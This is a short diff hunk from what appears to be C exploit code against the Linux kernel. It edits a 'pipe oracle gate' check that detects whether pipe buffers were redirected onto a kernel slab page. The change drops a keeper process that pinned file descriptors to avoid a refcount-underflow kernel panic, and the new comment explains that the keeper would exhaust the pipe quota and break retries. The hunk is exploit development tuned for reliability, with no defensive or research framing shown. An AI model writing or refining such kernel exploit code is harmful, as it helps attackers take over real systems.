@@ -1049,19 +1049,14 @@ int verify_p0_pipe_oracle_gate(void) {
     return 1;
   }
   if (gate_hits == 0 && changed_pages == 0) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     /*
-     * The gate slot may have redirected a pipe buffer to the kernel
-     * slab page even though the marker was never observed, and the
-     * gate holders now tee that redirected buffer.  Closing the
-     * holders put_page's the slab page behind the redirect, which
-     * underflows its refcount and panics the kernel on the next
-     * mm_struct allocation.  Pin every pipe and holder in a keeper
-     * child (retained=-1 keeps all inherited fds open) so the next
-     * fresh-page attempt can reuse the same oracle session.
+     * Clean miss: every pipe was tee'd and read back as the pristine
+     * marker, proving no redirect landed (a redirect would have made
+     * changed_pages > 0).  No keeper is needed here; spawning one
+     * would pin ~1152 fds and exhaust the per-uid pipe quota, so the
+     * next attempt dies at F_SETPIPE_SZ/EPERM.  The holders and pipes
+     * may close normally and release their page quota.
      */
-    spawn_p0_ref_keeper(-1);
-#endif
     return 0;
   }
   return -1;
